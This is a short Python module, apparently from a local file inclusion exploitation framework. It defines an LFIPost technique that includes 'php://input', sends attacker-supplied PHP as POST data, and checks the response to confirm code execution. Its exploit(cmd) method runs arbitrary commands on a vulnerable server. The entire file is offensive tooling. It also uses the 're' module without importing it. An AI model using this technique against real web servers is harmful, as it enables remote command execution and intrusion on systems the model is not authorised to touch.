from core.techniques.LFIExec import LFIExec

class LFIPost (LFIExec):
    files_exec = [
        # input
        { 'path' : 'php://input', 'type' : 'post' },
    ]

    # check if we got code exec
    def __check (self, content):
        lines = content.split ('\n')
        regexp = re.compile (self.lfi.tag_exec_code)
        for line in lines:
            if len (regexp.findall (line)) != 0:
                return True
        return False

    # find LFI code execution path
    def check (self):
        return super(LFIPost, self)._check (prepare_exec_header)

    # do exec
    def exploit (self, cmd):
        return super(LFIPost, self)._exploit (prepare_exec_header, cmd)
        
def prepare_exec_header (lfi, payload):
    lfi.form = payload
    return lfi.pattern_url[:]

